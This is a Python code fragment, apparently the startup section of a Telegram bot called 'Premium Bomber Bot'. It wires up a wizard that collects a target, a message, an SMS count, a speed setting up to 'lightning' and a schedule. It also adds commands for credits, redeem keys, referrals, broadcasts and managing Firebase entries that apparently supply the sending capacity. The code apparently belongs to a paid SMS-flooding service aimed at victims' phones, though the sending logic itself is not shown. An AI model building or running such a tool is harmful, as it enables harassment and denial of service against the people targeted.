    # Start health check server for Render
    start_health_thread()

    try:
        app = Application.builder().token(TOKEN).concurrent_updates(True).build()
        BOT = app.bot
        set_bot(BOT)

        conv_handler = ConversationHandler(
            entry_points=[
                CallbackQueryHandler(bomb_wizard_start, pattern="^bomb_wizard$"),
                CommandHandler("bomb", bomb_wizard_start),
                MessageHandler(filters.Regex('^💣 Launch Bomb$'), bomb_wizard_start),
            ],
            states={
                TARGET: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_target)],
                MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_message)],
                SMS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_sms_count)],
                SPEED: [CallbackQueryHandler(bomb_speed, pattern="^speed_(slow|medium|fast|lightning)$")],
                SCHEDULE: [MessageHandler(filters.TEXT & ~filters.COMMAND, bomb_schedule)],
            },
            fallbacks=[CommandHandler("cancel", cancel_conversation)],
            allow_reentry=True,
            per_message=False,
        )
        app.add_handler(conv_handler)

        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, button_handler))

        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("ping", ping))
        app.add_handler(CommandHandler("balance", balance_command))
        app.add_handler(CommandHandler("redeem", redeem_command))
        app.add_handler(CommandHandler("addkey", addkey_command))
        app.add_handler(CommandHandler("addcredits", addcredits_command))
        app.add_handler(CommandHandler("history", history_command))
        app.add_handler(CommandHandler("cancel", cancel_job_command))
        app.add_handler(CommandHandler("addfb", add_firebase_command))
        app.add_handler(CommandHandler("deletefb", delete_firebase_command))
        app.add_handler(CommandHandler("broadcast", broadcast_command))
        app.add_handler(CommandHandler("bomb", quick_bomb))
        app.add_handler(CommandHandler("refer", refer_command))
        app.add_handler(CommandHandler("admin", admin_panel))

        app.add_handler(CallbackQueryHandler(callback_handler, pattern="^(devices|stats|manage_fb|fb_delete_.+|fb_test_.+|job_cancel_.+|back_main|add_fb|balance|history|redeem_key|gen_key|status|check_join)$"))
        app.add_handler(CallbackQueryHandler(bomb_wizard_start, pattern="^bomb_wizard$"))

        logger.info("Premium Bomber Bot started (Application API).")
        app.run_polling(drop_pending_updates=True)

    except Exception as e:
        logger.error(f"❌ Failed to start the bot: {e}")
        print(f"\n❌ ERROR: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
